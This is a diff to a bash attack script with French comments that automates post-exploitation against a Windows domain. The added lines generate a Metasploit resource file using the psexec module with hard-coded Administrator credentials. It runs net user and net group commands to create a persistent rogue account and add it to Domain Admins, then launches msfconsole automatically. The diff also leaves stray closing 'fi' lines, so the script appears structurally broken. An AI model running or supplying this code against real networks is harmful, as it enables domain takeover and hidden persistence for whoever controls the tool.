@@ -35,10 +35,24 @@ if [[ "$elevate" =~ ^[Yy]$ ]]; then
     echo "[+] Lancement de l'escalade locale de privilèges..."
     python3 priv_esc.py
 
-    # Étape 6 : Proposer création de compte Domain Admin
+    # Étape 6 : Création automatique du compte Domain Admin via Metasploit
     read -p "[?] Créer un compte Domain Admin persistant ? (y/N) : " create_admin
     if [[ "$create_admin" =~ ^[Yy]$ ]]; then
-        echo "[+] Lancement de la création du compte Domain Admin..."
-        python3 domain_escalation.py
+        echo "[+] Génération du script de création d'un Domain Admin..."
+        cat > add_admin.rc <<EOF
+use exploit/windows/smb/psexec
+set RHOSTS $target
+set SMBUser Administrator
+set SMBPass P@ssw0rd!
+set PAYLOAD windows/exec
+set CMD net user rogueDC SuperPassw0rd! /add /domain && net group "Domain Admins" rogueDC /add /domain
+exploit
+exit
+EOF
+        echo "[✓] Script add_admin.rc généré. Lancement automatique de msfconsole..."
+        msfconsole -r add_admin.rc
+    fi
+fi
+
     fi
 fi
